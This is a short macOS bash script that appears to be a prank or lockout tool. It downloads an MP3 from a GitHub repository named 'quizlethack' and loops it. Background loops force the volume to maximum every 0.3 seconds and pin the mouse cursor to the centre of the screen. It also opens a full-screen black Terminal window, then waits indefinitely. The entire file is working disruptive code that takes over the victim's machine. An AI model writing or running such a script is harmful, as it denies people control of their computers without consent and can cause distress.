#!/bin/bash

# Ensure the MP3 is downloaded
curl -L -o /tmp/von.mp3 "https://github.com/hoursinblack/quizlethack/raw/main/King%20Von%20-%20Armed%20%26%20Dangerous%20(Audio).mp3"

# Start infinite volume maxer
while true; do
  osascript -e 'set volume output volume 100'
  sleep 0.3
done &
VOLUME_PID=$!

# Create fullscreen black window in Terminal
osascript <<EOF
tell application "Terminal"
    activate
    do script "clear && printf '\\033[30;40m'; while true; do printf '\\033[2J'; sleep 1; done"
    set bounds of front window to {0, 0, 3000, 2000}
end tell
EOF

# Start mouse trap in background (requires Accessibility permission)
python3 - <<EOF &
import Quartz, time
from AppKit import NSScreen

frame = NSScreen.mainScreen().frame()
center_x = int(frame.size.width / 2)
center_y = int(frame.size.height / 2)

while True:
    Quartz.CGWarpMouseCursorPosition((center_x, center_y))
    time.sleep(0.05)
EOF
MOUSE_PID=$!

# Loop the MP3 forever
while true; do
  afplay /tmp/von.mp3
done &
AUDIO_PID=$!

# Wait forever
wait
